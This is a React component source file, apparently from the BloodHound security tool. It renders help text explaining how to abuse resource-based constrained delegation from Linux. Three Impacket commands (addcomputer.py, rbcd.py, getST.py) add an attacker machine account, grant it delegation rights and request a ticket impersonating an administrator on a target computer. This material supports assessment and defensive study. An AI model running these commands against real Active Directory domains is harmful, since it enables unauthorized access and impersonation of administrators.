// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const LinuxAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer
                account can be added with Impacket's addcomputer.py example script:
            </Typography>
            <Typography component={'pre'}>
                {
                    "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                }
            </Typography>
            <Typography variant='body2'>
                We now need to configure the target object so that the attacker-controlled computer can delegate to it.
                Impacket's rbcd.py script can be used for that purpose:
            </Typography>
            <Typography component={'pre'}>
                {
                    "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                }
            </Typography>
            <Typography variant='body2'>
                And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin"
                for. Impacket's getST.py example script can be used for that purpose.
            </Typography>
            <Typography component={'pre'}>
                {
                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                }
            </Typography>
            <Typography variant='body2'>
                This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the
                TARGETCOMPUTER.
            </Typography>
        </>
    );
};

export default LinuxAbuse;
